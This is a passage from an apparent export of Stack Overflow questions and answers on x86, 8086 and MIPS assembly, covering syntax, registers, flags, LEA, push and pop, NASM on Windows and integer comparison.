<p>So it seems it may have mixed 32 and 64 bits, must I tell the complier whether the assembly is 32 or 64 bit instructions?</p>

<h2>Update</h2>

<p>This test worked with gcc.</p>

<pre><code>$ cat hello.s
.data
.globl hello
hello:
.string ""Hi World\n""

.text
.global main
main:
    pushq   %rbp
    movq    %rsp,       %rbp
    movq    $hello,     %rdi
    call    puts
    movq    $0,         %rax
    leave
    ret
$ gcc hello.s -o hello
$ ./hello 
Hi World
</code></pre>
","<p>You're already doing it.</p>

<pre><code>gcc -c asm_functions.S
</code></pre>

<p>That step produces an object file, <code>asm_functions.o</code>.  The object file is ""linkable"" (as opposed to ""loadable"") file that contains the machine code, with some extra instructions for how the linker should modify the code when linking.  The <code>gcc</code> program itself is just a driver, it runs <code>as</code> behind the scenes for you to produce <code>asm_functions.o</code>.  So you do have the option of running <code>as</code> directly, but often it's easier to run the <code>gcc</code> frontend.</p>
","14930880"
"new line in 8086 assembly","26701","","<p>I wanna to print table of multiple numbers from 0 to 9 in assembly.
so I program below code:</p>

<pre><code>data_seg segment
    I DB 0D
    J DB 0D
    R DB ?
    DIVER DB 10D
    data_seg ends

stack_seg segment
    stack_seg ends

code_seg segment
    MAIN proc far
        assume cs:code_seg, ds:data_seg, ss:stack_seg
        MOV AX,data_seg
        MOV DS,AX

        FOR1:
            MOV J,0D
            FOR2:
            MOV AX,0H
            MOV AL,I
            MUL J
            DIV DIVER 
            MOV R,AH
            ADD AL,48D
            MOV AH,0EH
            INT 10H
            MOV AL,R
            ADD AX,48D
            MOV AH,0EH
            INT 10H

            MOV AX,32D
            MOV AH,0EH
            INT 10H
            INC J 
            MOV AX,0
            MOV AL,J
            SUB AX,10D
            JNZ FOR2
         INC I
         MOV AX,10D
         MOV AH,0EH
         INT 10H
         MOV AX,0
         MOV AL,I
         SUB AX,10D
         JNZ FOR1

        MOV AX,4CH
        INT 21H
        MAIN endp
    code_seg ends
end MAIN</code></pre>  

<p>It works correctly,but with a small problem,when I wanna print new line ,and printed something in current line,it will go to new line,but with some space before new line.
<img src=""https://i.stack.imgur.com/lKMQk.jpg"" alt=""enter image description here""></p>
","<p>You need to print new line <em>and</em> carriage return.</p>
","8374041"
"Limitations of Intel Assembly Syntax Compared to AT&T","26560","","<p>To me, Intel syntax is much easier to read. If I go traipsing through assembly forest concentrating only on Intel syntax, will I miss anything? Is there any reason I would want to switch to AT&amp;T (outside of being able to read others' AT&amp;T assembly)? My first clue is that gdb uses AT&amp;T by default.</p>

<p>If this matters, my focus is only on any relation assembly and syntax may have to Linux/BSD and the C language.</p>
","<p>There is really no advantage to one over the other. I agree though that Intel syntax is <strong>much</strong> easier to read. Keep in mind that, AFAIK, all GNU tools have the option to use Intel syntax also.</p>

<p>It looks like you can make GDB use Intel syntax with this:</p>

<pre>
set disassembly-flavor intel
</pre>

<p>GCC can do Intel syntax with <code>-masm=intel</code>.</p>
","972614"
"dword ptr usage confusion","26427","","<p>In assembly language if we use</p>

<pre><code>mov eax, dword ptr[ebx]
</code></pre>

<p>then it means copy the value pointed by ebx (ebx contains the address value, not the actual value, this instruction copies the actual value in the address)?</p>

<p>If we use</p>

<pre><code>mov eax, dword ptr[some_variable]
</code></pre>

<p>then it means copy the value of variable ""some_variable"" itself to eax, not copy the value pointed by variable ""some_variable""?</p>

<p>Is my understanding correct?</p>

<p>If yes, I'm confused why the same assembly instruction has two different meansings - in the first case there is a level of indirection, but in the second there is no additional level of indirection.</p>

<p>Any comment?</p>

<p>EDIT:</p>

<p>Not every [] does not taking any effect, for example, instruction xchg will take a level of in-direction, which loads value pointed by edx.</p>

<p>Whole source code could be found from,</p>

<p><a href=""http://www.codeproject.com/KB/threads/spinlocks.aspx"" rel=""noreferrer"">http://www.codeproject.com/KB/threads/spinlocks.aspx</a></p>

<pre><code>#ifdef WIN32
inline int CPP_SpinLock::TestAndSet(int* targetAddress, int nValue)
{
    __asm {
        mov edx, dword ptr [pTargetAddress]
        mov eax, nValue
        lock xchg eax, dword ptr [edx]
    }
}
#endif // WIN32
</code></pre>
","<p>In both cases you ask the processor to move the value from a specified address. It's one level of indirection. In the first case you ask it to take the address from a specified register. In the second case you specify an offset directly.</p>

<p>x86 processors don't support dual level indirection, so it's not possible to request to load a value from an address specified somewhere in memory - you have to load the address onto a register.</p>

<p>Under a number of assemblers (MASM and built into VC++ assembler for example) you could as well write just</p>

<pre><code>mov eax, dword ptr some_variable
</code></pre>

<p>without brackets, it would mean the same.</p>

<p>You could write</p>

<pre><code>move eax, dword ptr [variable][ebx]
</code></pre>

<p>this would instruct to take the address of ""variable"", then add value of ebx and use the sum as an address from which to load a value. This is often used for accessing array elements by index.</p>

<p>In all these cases the processor would do the same - load a value from a specified address. It's one level of indirection each time.</p>
","688825"
"assembly ""mov"" instruction","26282","","<p>I'm learning assembly by comparing a c program to its assembly equivalent.</p>

<p>Here is the code.</p>

<pre><code>.file   ""ex3.c""
.section    .rodata
.LC0:
    .string ""I am %d years old.\n""
.LC1:
    .string ""I am %d inches tall.\n""
    .text
    .globl  main
    .type   main, @function
main:
    pushl   %ebp    //establish stack frame//
    movl    %esp, %ebp //move esp into ebp, all contents saved down stack//
    andl    $-16, %esp //16 from esp for local var space//
    subl    $32, %esp//stack frame reserving - 32 bytes//
    movl    $10, 24(%esp)
    movl    $72, 28(%esp)
    movl    24(%esp), %eax
    movl    %eax, 4(%esp)
    movl    $.LC0, (%esp)
    call    printf
    movl    28(%esp), %eax
    movl    %eax, 4(%esp)
    movl    $.LC1, (%esp)
    call    printf
    movl    $0, %eax
    leave
    ret
    .size   main, .-main
    .ident  ""GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2""
    .section    .note.GNU-stack,"""",@progbits
</code></pre>

<p>For this line:</p>

<pre><code>movl    $10, 24(%esp)
</code></pre>

<p>If I understand it correctly it is saying move the value of 10 into the esp register. But what is the 24 doing? I don't think it is moved into esp because a value to be moved is denoted by ""$"" (i think)</p>
","<pre><code>movl $10,24(%esp)
</code></pre>

<p>means: move a literal decimal-10 long (4-bytes) into a 4-byte memory location that begins at the address pointed to by (the <code>esp</code> register plus decimal 24)--basically it is a local variable.</p>
","24747090"
"What is the practical difference between the SI and DI registers?","26258","","<p>I don't get what is the difference. </p>
","<p>When you are using instructions like movsb, si is considered as the <strong>s</strong>ource register, while di is considered as the <strong>d</strong>estination register. But they are both normal x86 registers.</p>
","1484142"
"How many bits is a WORD and is that constant over different architectures?","26221","","<p>Is a machine <em>WORD</em> always the same or does it depend on the machine architecture?
And is the meaning of the word <em>WORD</em> context sensitive or generally applicable?</p>
","<p>The machine word size depends on the architecture, but also how the operating system is running the application.</p>

<p>In Windows x64 for example an application can be run either as a 64 bit application (having a 64 bit mahine word), or as a 32 bit application (having a 32 bit machine word). So the size of a machine word can differ even on the same machine.</p>

<p>The term <code>WORD</code> has different meaning depending on how it's used. It can either mean a machine word, or a type with a specific size. In x86 assembly language <code>WORD</code>, <code>DOUBLEWORD</code> (<code>DWORD</code>) and <code>QUADWORD</code> (<code>QWORD</code>) are used for 2, 4 and 8 byte sizes, regardless of the machine word size.</p>
","621665"
"What is the best way to learn x86 assembly on a Linux platform?","26078","","<p>I have no prior knowledge of assembly programming, and would like to learn how to code x86 assembly on a Linux platform. However, I'm having a hard time finding a good resource to teach myself with.</p>

<p>The Art of Assembly book looks good, but it teaches HLA. I'm not interested in having to learn one way, then relearning it all over again. It also seems like RISC architectures have better resources for assembly, but unfortunately I do not have a RISC processor to learn with. Does anyone have any suggestions?</p>
","<p><a href=""http://asm.sf.net"" rel=""nofollow noreferrer"">http://asm.sf.net</a> has some material on architectures besides x86.  </p>

<p>If you are interested in RISC architectures, you could run Linux on <a href=""http://www.nongnu.org/qemu/about.html"" rel=""nofollow noreferrer"">Qemu</a>. Qemu emulates several RISC architectures like PowerPC, ARM and MIPS. You might be able to find a ready to use Qemu hard disk image <a href=""http://www.oszoo.org/wiki/index.php/Category:OS_images"" rel=""nofollow noreferrer"">here</a>.</p>

<p>Another way to experiment with RISC architectures would be to use gdb's built-in simulator.</p>
","721871"
"about assembly CF(Carry) and OF(Overflow) flag","26074","","<p>It's known that CF indicates unsigned carry out and OF indicates signed overflow. So how does an assembly program differentiate between unsigned and signed data since it's only a sequence of bits? (Through additional memory storage for type information, or through positional information or else?) And could these two flags be used interchangeably?</p>
","<p>The distinction is in what instructions are used to manipulate the data, not the data itself.  Modern computers (since circa 1970) use a representation of integer data called two's-complement in which addition and subtraction work exactly the same on both signed and unsigned numbers.  </p>

<ul>
<li><p>The difference in representation is the interpretation given to the most significant bit (also called the <em>sign bit</em>).  For unsigned numbers that bit means a very  large positive number; for signed numbers that means a very large negative number (negative number with a big absolute value). </p></li>
<li><p>Different instructions may use different interpretations of the same bit.  For example most big machines have both signed and unsigned multiply instructions.  Machines with a 'set less than' instruction may have both signed and unsigned flavors.</p></li>
<li><p>The OF (overflow flag) tells whether a carry flipped the sign of the most significant bit in the result so that it is different from the most significant bits of the arguments.  If numbers are interpreted as unsigned, the overflow flag is irrelevant, but if they are interpreted as signed, OF means, e.g., two large positive numbers were added and the result was negative.</p></li>
<li><p>The CF (carry flag) tells whether a bit was carried out of the word entirely (e.g. into bit 33 or bit 65).  If numbers are interpreted as unsigned, carry flag means that addition overflowed, and the result is too large to fit in a machine word.  The overflow flag is irrelevant.</p></li>
</ul>

<p>The answer to your question is that assembly code has several ways of distinguishing signed from unsigned data:</p>

<ul>
<li>It may choose either CF or OF to do signed or unsigned comparisons.</li>
<li>It may choose either signed or unsigned multiply and divide instructions.</li>
<li>It may choose a signed or unsigned right shift (signed copies the high bit; unsigned shifts in zeroes).</li>
</ul>
","792028"
"Storing values in HI and LO registers of MIPS","26018","","<p>I am writing certain code in MIPS and I've come to the point where the requirement is to store the result, temporarily, in <code>HI</code> and <code>LO</code> special registers (both are 4 bytes wide). These instructions are at my disposal:</p>

<pre><code>divu     s,t    lo &lt;-- s div t ; hi &lt;-- s mod t
multu    s,t    hi / lo &lt; -- s * t ;
</code></pre>

<p>So, <code>divu</code> stores result of division in <code>LO</code> and remainder in <code>HI</code>, while <code>multu</code> stores result of multiplication in <code>LO</code> (lower 4 bytes) and <code>HI</code> (higher 4 bytes).</p>

<p>Later, to retrieve result from <code>HI</code> and <code>LO</code> registers, I can:</p>

<pre><code>mfhi $v0
mflo $v1
</code></pre>

<p>I already figured out how to store result of a calculation in <code>LO</code>:</p>

<pre><code>ori     $v0,$0,1            # Store result from $a0 into LO
divu    $a0,$v0
</code></pre>

<ul>
<li>the <code>divu</code> stores result of the division in LO, so I just divide result by 1 to get it there.</li>
</ul>

<p>However, storing in <code>HI</code> is more complicated. One way would be to force <code>multu</code> instruction to shift the value by 32 bits (4 bytes):</p>

<pre><code>multu    $a0,0x80000000     # Shift $a0 by 32 bits and store into HI/LO
</code></pre>

<p>But, the result is that the value in <code>HI</code> is 1 bit right of where it should be (so if my value is <code>0100 1000</code> then <code>HI</code> will contain <code>0010 0100</code>).</p>

<p>Does anyone know how to store something in <code>HI</code> register?</p>
","<p>I'd like to extend Nils Pipenbrinck answer:</p>

<p>From MIPS32 arquitechture for programmers </p>

<h1>mthi</h1>

<p>Format:                                                     MIPS32 (MIPS I)</p>

<pre><code>  MTHI rs
</code></pre>

<p>Purpose:
To copy a GPR to the special purpose HI register</p>

<pre><code>Description: HI ← rs
</code></pre>

<p>The contents of GPR rs are loaded into special register HI.</p>

<p>Restrictions:</p>

<p>A computed result written to the HI/LO pair by DIV, DIVU,MULT, or MULTU must be read by MFHI or MFLO
before a new result can be written into either HI or LO.
If an MTHI instruction is executed following one of these arithmetic instructions, but before an MFLO or MFHI
instruction, the contents of LO are UNPREDICTABLE. The following example shows this illegal situation:</p>

<pre><code> MUL       r2,r4   # start operation that will eventually write to HI,LO
 ...               # code not containing mfhi or mflo
 MTHI      r6
 ...               # code not containing mflo
                   # this mflo would get an UNPREDICTABLE value
 MFLO      r3
</code></pre>

<p>Historical Information:</p>

<p>In MIPS I-III, if either of the two preceding instructions is MFHI, the result of that MFHI is UNPREDICTABLE.
Reads of the HI or LO special register must be separated from any subsequent instructions that write to them by two
or more instructions. In MIPS IV and later, including MIPS32 and MIPS64, this restriction does not exist.</p>

<h1>mtlo</h1>

<p>Format:         MIPS32 (MIPS I)</p>

<pre><code>    MTLO rs
</code></pre>

<p>Purpose:
To copy a GPR to the special purpose LO register
Description:</p>

<pre><code> LO ← rs
</code></pre>

<p>The contents of GPR rs are loaded into special register LO.</p>

<p>Restrictions:
A computed result written to the HI/LO pair by DIV, DIVU, MULT, or MULTU must be read by MFHI or MFLO before a new result can be written into either HI or LO.</p>

<p>If an MTLO instruction is executed following one of these arithmetic instructions, but before an MFLO or MFHI instruction, the contents of HI are UNPREDICTABLE.
 The following example shows this illegal situation:</p>

<pre><code> MUL       r2,r4   # start operation that will eventually write to HI,LO
 ...               # code not containing mfhi or mflo
 MTLO      r6
 ...               # code not containing mfhi
                   # this mfhi would get an UNPREDICTABLE value
 MFHI      r3
</code></pre>

<p>Historical Information:</p>

<p>In MIPS I-III, if either of the two preceding instructions is MFHI, the result of that MFHI is UNPREDICTABLE.
Reads of the HI or LO special register must be separated from any subsequent instructions that write to them by two
or more instructions. In MIPS IV and later, including MIPS32 and MIPS64, this restriction does not exist.</p>
","824536"
"Invalid instruction suffix for push when assembling with gas","25806","","<p>When assembling a file with GNU assembler I get the following error:</p>

<blockquote>
  <p>hello.s:6: Error: invalid instruction suffix for `push'</p>
</blockquote>

<p>Here's the file that I'm trying to assemble:</p>

<pre><code>        .text
LC0:
        .ascii ""Hello, world!\12\0""
.globl _main
_main:
        pushl   %ebp
        movl    %esp, %ebp
        subl    $8, %esp
        andl    $-16, %esp
        movl    $0, %eax
        movl    %eax, -4(%ebp)
        movl    -4(%ebp), %eax
        call    __alloca
        call    ___main
        movl    $LC0, (%esp)
        call    _printf
        movl    $0, %eax
        leave
        ret
</code></pre>

<p>What is wrong here and how do I fix it?</p>

<p>The problem is somewhat related to <a href=""https://stackoverflow.com/q/5485468/471164"">this question</a> although errors and instructions in questions are different.</p>
","<p>64bit instructions</p>

<p>By default most operations remain 32-bit and the 64-bit counterparts are invoked by the fourth bit in the REX prefix. This means that each 32-bit instruction has it's natural 64-bit extension and that extended registers are for free in 64-bit instructions</p>

<pre><code>movl $1,  %eax     # 32-bit instruction
movq $1,  %rax     # 64-bit instruction

pushl %eax         # Illegal instruction
pushq %rax         # 1 byte instruction encoded as pushl %eax in 32 bits
pushq %r10         # 2 byte instruction encoded as pushl preceeded by REX
</code></pre>
","6455045"
"assembly vim syntax highlighting","25728","","<p>The default assembly syntax file didn't work well and searching the web about gas assembly I found nothing about a gas (AT&amp;T) syntax file for vim. Has anyone found this? I can't write my own syntax file.</p>

<p><a href=""http://img168.imageshack.us/img168/46/nasm.png"">http://img168.imageshack.us/img168/46/nasm.png</a> ft=nasm</p>

<p><a href=""http://img160.imageshack.us/img160/5857/asm.png"">http://img160.imageshack.us/img160/5857/asm.png</a> ft=asm(default)</p>

<p><a href=""http://img164.imageshack.us/img164/8476/tasm.png"">http://img164.imageshack.us/img164/8476/tasm.png</a> ft=tasm</p>
","<p><a href=""http://www.thouters.be/Vim8051Syn"" rel=""nofollow noreferrer"">This may</a> get you started. Is that more like what you're looking for?</p>

<p>Just had a quick search - it looks like there are a few different sorts of assembly syntax highlighting built in. Which one are you using?</p>

<p>Copy-pasted from :help syntax</p>

<pre><code>Currently these syntax
files are included:
    asm     GNU assembly (the default)
    asm68k      Motorola 680x0 assembly
    asmh8300    Hitachi H-8300 version of GNU assembly
    ia64        Intel Itanium 64
 fasm Flat assemlby http://flatassembler.net
    masm        Microsoft assembly (probably works for any 80x86)
    nasm        Netwide assembly
    tasm        Turbo Assembly (with opcodes 80x86 up to Pentium, and
            MMX)
    pic     PIC assembly (currently for PIC16F84)

The most flexible is to add a line in your assembly file containing:
    :asmsyntax=nasm
Replace ""nasm"" with the name of the real assembly syntax.  This line must be
one of the first five lines in the file.
</code></pre>

<p>This additional <a href=""http://www.vim.org/scripts/script.php?script_id=966"" rel=""nofollow noreferrer"">syntax script</a> is from vim.org</p>

<p>It  looks like your screenshot is using the default asm filetype.
Try</p>

<pre><code>:set ft=nasm
</code></pre>

<p>and you should get some colour changes as per these screenshots.</p>

<p><a href=""https://imgur.com/2BJy.jpg"" rel=""nofollow noreferrer""><img src=""https://imgur.com/2BJy.jpg"" alt=""ft=nasm""></a></p>

<p><a href=""https://i.stack.imgur.com/eetUv.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eetUv.jpg"" alt=""""></a></p>

<p>From your screenshots above I've made a couple of quick modifications to the fasm vim syntax and called it gasm.
It can be found <a href=""http://pastebin.com/f65d3943e"" rel=""nofollow noreferrer"">here</a> on pastebin.</p>

<p>Copy and paste that into your personal .vim/syntax or vimfiles/syntax directory and call it gasm.vim
Then in your assembly file :set ft=gasm</p>

<p>This vim script relies on comments being of the form
    % comment
with the space included.
You can see this (or change it if you wish) on line 116 of the script.</p>

<p>Please note: Don't copy the line numbers.</p>
","782421"
"Difference between SHL and SAL in 80x86","25711","","<p>I have learned how to work with 80x86 assembler, so in bit-wise shift operation, I faced a problem with SAL and SHL usage. I means the difference between lines of code as follow :</p>

<pre><code>MOV X, 0AAH
SAL X, 4

MOV X, 0AAH
SHL X, 4
</code></pre>

<p>When we should use SHL and when use SAL? What is the difference of them?</p>
","<p>According to <a href=""http://siyobik.info/main/reference/instruction/SAL/SAR/SHL/SHR"" rel=""noreferrer"">this</a>, they are the same:</p>

<blockquote>
  <p>The shift arithmetic left (SAL) and shift logical left (SHL)
  instructions perform the same operation; they shift the bits in the
  destination operand to the left (toward more significant bit
  locations). For each shift count, the most significant bit of the
  destination operand is shifted into the CF flag, and the least
  significant bit is cleared (see Figure 7-7 in the Intel®64 and IA-32
  Architectures Software Developer'sManual, Volume 1).</p>
</blockquote>

<p>Both were probably included just for completeness since there <em>is</em> a distinction for right-shifts.</p>
","8373433"
"What does `dup (?)` mean in TASM?","25498","","<p>I have this code here, but I'm unfamiliar with the syntax.</p>

<pre><code>STACK16_SIZE    =       100h
stack16         db      STACK16_SIZE dup (?)
</code></pre>

<p>I think <code>dup</code> means we declare a variable of type array, as this is a stack, but I'm not sure. So what does <code>dup</code> mean in TASM, exactly?</p>
","<p><code>STACK16_SIZE dup (?)</code> means to duplicate the data in parenthesis by <code>STACK16_SIZE</code> times.  It is equivalent to writing <code>?, ?, ?, ?,</code> ... (100h times)</p>

<p>The data in parens is ""uninitialized data"".  That is, memory is allocated, but not set to any particular value on load.</p>

<p>Assembly does not provide an array ""type"".  If it does, it is only for debuggers for use when inspecting the data.  However, in this code snippet, <code>stack16</code> is a symbol with an address beginning a memory block of bytes&mdash;which is counter-intuitive and potentially a source of a subtle bug.  For a CPU stack, it really ought to be defined as 16 bit words (<code>dw</code>) or 32 bit words (<code>dd</code>).</p>
","15956186"
"How to check the EIP value with assembly language?","25465","","<p>I want to get the current value of the EIP register with assembly language. Is that possible?</p>
","<p>Assuming 32-bit x86, use the following function:</p>

<pre><code>get_eip: mov eax, [esp]
         ret
</code></pre>

<p>Then, to get the value of EIP in EAX, simply:</p>

<pre><code>call get_eip
</code></pre>
","4062434"
"how does push and pop work in assembly","25430","","<p>I'm getting confused on what does <code>pop</code> actually do in assembly. Does <code>pop</code> move the value <code>PUSH</code>ed onto the stack last (meaning it doesn't apply if we <code>MOV</code> a value after the the last element <code>PUSH</code>ed) or does it just pop whatever value that's last on the stack (thus, applying to both <code>MOV</code> and <code>PUSH</code>), or does it pop what ever value pointed to by the stack pointer?    Consider the following code:</p>

<pre><code>push $4
mov $5, -4(%esp)
add $4, %esp (esp pointing to an unknown value)
pop %ebp
</code></pre>

<p>So in this code will the value poped into <code>ebp</code> be 4, 5, or the unknown value pointed to by <code>esp</code>?</p>
","<p>The latter</p>

<pre><code>POP EBP
</code></pre>

<p>is equivalent to</p>

<pre><code>MOV EBP, [ESP]
ADD ESP, 4           ; but without modifying flags, like  LEA ESP, [ESP+4]
</code></pre>

<p>(in Intel syntax - target on the left, source on the right)</p>
","26026278"
"What does the LEAL assembly instruction do?","25351","","<p>I am a little bit confused about the difference between</p>

<pre><code>leal -4(%ebp), %eax       
</code></pre>

<p>and </p>

<pre><code>movl -4(%ebp), %eax
</code></pre>

<p>Can someone explain this to me? </p>
","<p><a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/LEA.htm"" rel=""noreferrer"">LEA</a> (load effective address) just computes the <em>address</em> of the operand, it does not actually dereference it.  Most of the time, it's just doing a calculation like a combined multiply-and-add for, say, array indexing.</p>

<p>In this case, it's doing a simple numeric subtraction: <code>leal -4(%ebp), %eax</code> just assigns to the <code>%eax</code> register the value of <code>%ebp - 4</code>.  It's equivalent to a single <code>sub</code> instruction, except a <code>sub</code> requires the destination to be the same as one of the sources.</p>

<p>The <code>movl</code> instruction, in contrast, accesses the memory location at <code>%ebp - 4</code> and stores that value into <code>%eax</code>.</p>
","11212925"
"Hello world using nasm in windows assembly","25111","","<p>I'm using <a href=""http://sourceforge.net/projects/nasm/"" rel=""nofollow noreferrer"">nasm</a> to compile the following assembly. However the code crashes in the console under Windows.</p>

<blockquote>
  <p>C:\>nasm -f win32 test.asm -o test.o</p>
  
  <p>C:\>ld test.o -o test.exe</p>
</blockquote>

<pre><code>section .data
  msg   db    'Hello world!', 0AH
  len   equ   $-msg

section .text
  global _WinMain@16

_WinMain@16:
  mov   edx, len
  mov   ecx, msg
  mov   ebx, 1
  mov   eax, 4
  int   80h

  mov   ebx, 0
  mov   eax, 1
  int   80h
</code></pre>

<p>According to this <a href=""http://en.kioskea.net/faq/1559-compiling-an-assembly-program-with-nasm"" rel=""nofollow noreferrer"">post</a>. The <code>main</code> function is not available under Windows and must be replaced by <code>WinMain</code>.</p>

<p>So if your entry point is <code>_start</code> or <code>main</code>, it should be changed to <code>_WinMain@16</code> and change the <code>ret</code> at the end of the procedure to <code>ret 16</code>:</p>

<p>My working example:</p>

<pre><code>section .text       
 global _WinMain@16       

_WinMain@16:       
 mov eax, 0       
 ret 16 
</code></pre>
","<p>The biggest problem is that you are trying to use Linux interupts on windows!
int 80 will NOT work on windows.</p>

<p>We are using Assembly, so your entry point can be ANY label you want. The standard entry point that ld looks for is _start, if you want to use another label, you need to tell ld with the -e option
So if you want your start label to be main, then you need </p>

<pre><code>global main
ld -e main test.o -o test.exe
</code></pre>

<p>If you are going to use NASM on Windows, I will recommend using GoLink as your linker.
Here is a simple windows console app:</p>

<pre><code>STD_OUTPUT_HANDLE   equ -11
NULL                equ 0

global GobleyGook
extern ExitProcess, GetStdHandle, WriteConsoleA

section .data
msg                 db ""Hello World!"", 13, 10, 0
msg.len             equ $ - msg

section .bss
dummy               resd 1

section .text
GobleyGook:
    push    STD_OUTPUT_HANDLE
    call    GetStdHandle

    push    NULL
    push    dummy
    push    msg.len
    push    msg
    push    eax
    call    WriteConsoleA 

    push    NULL
    call    ExitProcess
</code></pre>

<p>makefile:</p>

<pre><code>hello: hello.obj
    GoLink.exe  /console /entry GobleyGook hello.obj kernel32.dll  

hello.obj: hello.asm
    nasm -f win32 hello.asm -o hello.obj
</code></pre>
","12575061"
"Efficient integer compare function","25108","","<p>The <code>compare</code> function is a function that takes two arguments <code>a</code> and <code>b</code> and returns an integer describing their order. If <code>a</code> is smaller than <code>b</code>, the result is some negative integer. If <code>a</code> is bigger than <code>b</code>, the result is some positive integer. Otherwise, <code>a</code> and <code>b</code> are equal, and the result is zero.</p>

<p>This function is often used to parametrize sorting and searching algorithms from standard libraries.</p>

<p>Implementing the <code>compare</code> function for characters is quite easy; you simply subtract the arguments:</p>

<pre><code>int compare_char(char a, char b)
{
    return a - b;
}
</code></pre>

<p>This works because the difference between two characters is generally assumed to fit into an integer. (Note that this assumption does not hold for systems where <code>sizeof(char) == sizeof(int)</code>.)</p>

<p>This trick cannot work to compare integers, because the difference between two integers generally does not fit into an integer. For example, <code>INT_MAX - (-1) = INT_MIN</code> suggests that <code>INT_MAX</code> is smaller than <code>-1</code> (technically, the overflow leads to undefined behavior, but let's assume modulo arithmetic).</p>

<p>So how can we implement the compare function efficiently for integers? Here is my first attempt:</p>

<pre><code>int compare_int(int a, int b)
{
    int temp;
    int result;
    __asm__ __volatile__ (
        ""cmp %3, %2 \n\t""
        ""mov $0, %1 \n\t""

        ""mov $1, %0 \n\t""
        ""cmovg %0, %1 \n\t""

        ""mov $-1, %0 \n\t""
        ""cmovl %0, %1 \n\t""
    : ""=r""(temp), ""=r""(result)
    : ""r""(a), ""r""(b)
    : ""cc"");
    return result;
}
</code></pre>

<p>Can it be done in less than 6 instructions? Is there a less straightforward way that is more efficient?</p>
","<p>The following has always proven to be fairly efficient for me:</p>

<pre><code>return (a &lt; b) ? -1 : (a &gt; b);
</code></pre>

<p>With <code>gcc -O2 -S</code>, this compiles down to the following five instructions:</p>

<pre><code>xorl    %edx, %edx
cmpl    %esi, %edi
movl    $-1, %eax
setg    %dl
cmovge  %edx, %eax
</code></pre>

<hr>

<p>As a follow-up to <a href=""https://stackoverflow.com/a/10997428/315052"">Ambroz Bizjak's excellent companion answer</a>, I was not convinced that his program tested the same assembly code what was posted above. And, when I was studying the compiler output more closely, I noticed that the compiler was not generating the same instructions as was posted in either of our answers. So, I took his test program, hand modified the assembly output to match what we posted, and compared the resulting times. <strong>It seems the two versions compare roughly identically.</strong></p>

<pre><code>./opt_cmp_branchless: 0m1.070s
./opt_cmp_branch:     0m1.037s
</code></pre>

<p>I am posting the assembly of each program in full so that others may attempt the same experiment, and confirm or contradict my observation.</p>

<p>The following is the version with the <code>cmovge</code> instruction (<code>(a &lt; b) ? -1 : (a &gt; b)</code>):</p>

<pre><code>        .file   ""cmp.c""
        .text
        .section        .rodata.str1.1,""aMS"",@progbits,1
.LC0:
        .string ""%d=0\n""
        .text
        .p2align 4,,15
.globl main
        .type   main, @function
main:
.LFB20:
        .cfi_startproc
        pushq   %rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        pushq   %rbx
        .cfi_def_cfa_offset 24
        .cfi_offset 3, -24
        movl    $arr.2789, %ebx
        subq    $8, %rsp
        .cfi_def_cfa_offset 32
.L9:
        leaq    4(%rbx), %rbp
.L10:
        call    rand
        movb    %al, (%rbx)
        addq    $1, %rbx
        cmpq    %rbx, %rbp
        jne     .L10
        cmpq    $arr.2789+4096, %rbp
        jne     .L9
        xorl    %r8d, %r8d
        xorl    %esi, %esi
        orl     $-1, %edi
.L12:
        xorl    %ebp, %ebp
        .p2align 4,,10
        .p2align 3
.L18:
        movl    arr.2789(%rbp), %ecx
        xorl    %eax, %eax
        .p2align 4,,10
        .p2align 3
.L15:
        movl    arr.2789(%rax), %edx
        xorl    %ebx, %ebx
        cmpl    %ecx, %edx
        movl    $-1, %edx
        setg    %bl
        cmovge  %ebx, %edx
        addq    $4, %rax
        addl    %edx, %esi
        cmpq    $4096, %rax
        jne     .L15
        addq    $4, %rbp
        cmpq    $4096, %rbp
        jne     .L18
        addl    $1, %r8d
        cmpl    $500, %r8d
        jne     .L12
        movl    $.LC0, %edi
        xorl    %eax, %eax
        call    printf
        addq    $8, %rsp
        .cfi_def_cfa_offset 24
        xorl    %eax, %eax
        popq    %rbx
        .cfi_def_cfa_offset 16
        popq    %rbp
        .cfi_def_cfa_offset 8
        ret
        .cfi_endproc
.LFE20:
        .size   main, .-main
        .local  arr.2789
        .comm   arr.2789,4096,32
        .section        .note.GNU-stack,"""",@progbits
</code></pre>

<p>The version below uses the branchless method (<code>(a &gt; b) - (a &lt; b)</code>):</p>

<pre><code>        .file   ""cmp.c""
        .text
        .section        .rodata.str1.1,""aMS"",@progbits,1
.LC0:
        .string ""%d=0\n""
        .text
        .p2align 4,,15
.globl main
        .type   main, @function
main:
.LFB20:
        .cfi_startproc
        pushq   %rbp
        .cfi_def_cfa_offset 16
        .cfi_offset 6, -16
        pushq   %rbx
        .cfi_def_cfa_offset 24
        .cfi_offset 3, -24
        movl    $arr.2789, %ebx
        subq    $8, %rsp
        .cfi_def_cfa_offset 32
.L9:
        leaq    4(%rbx), %rbp
.L10:
        call    rand
        movb    %al, (%rbx)
        addq    $1, %rbx
        cmpq    %rbx, %rbp
        jne     .L10
        cmpq    $arr.2789+4096, %rbp
        jne     .L9
        xorl    %r8d, %r8d
        xorl    %esi, %esi
.L19:
        movl    %ebp, %ebx
        xorl    %edi, %edi
        .p2align 4,,10
        .p2align 3
.L24:
        movl    %ebp, %ecx
        xorl    %eax, %eax
        jmp     .L22
        .p2align 4,,10
        .p2align 3
.L20:
        movl    arr.2789(%rax), %ecx
.L22:
        xorl    %edx, %edx
        cmpl    %ebx, %ecx
        setg    %cl
        setl    %dl
        movzbl  %cl, %ecx
        subl    %ecx, %edx
        addl    %edx, %esi
        addq    $4, %rax
        cmpq    $4096, %rax
        jne     .L20
        addq    $4, %rdi
        cmpq    $4096, %rdi
        je      .L21
        movl    arr.2789(%rdi), %ebx
        jmp     .L24
.L21:
        addl    $1, %r8d
        cmpl    $500, %r8d
        jne     .L19
        movl    $.LC0, %edi
        xorl    %eax, %eax
        call    printf
        addq    $8, %rsp
        .cfi_def_cfa_offset 24
        xorl    %eax, %eax
        popq    %rbx
        .cfi_def_cfa_offset 16
        popq    %rbp
        .cfi_def_cfa_offset 8
        ret
        .cfi_endproc
.LFE20:
        .size   main, .-main
        .local  arr.2789
        .comm   arr.2789,4096,32
        .section        .note.GNU-stack,"""",@progbits
</code></pre>
","10996555"
"Getting cpu cycles using RDTSC - why does the value of RDTSC always increase?","24827","","<p>I want to get the CPU cycles at a specific point. I use this function at that point:</p>

<pre><code>static __inline__ unsigned long long rdtsc(void)
{
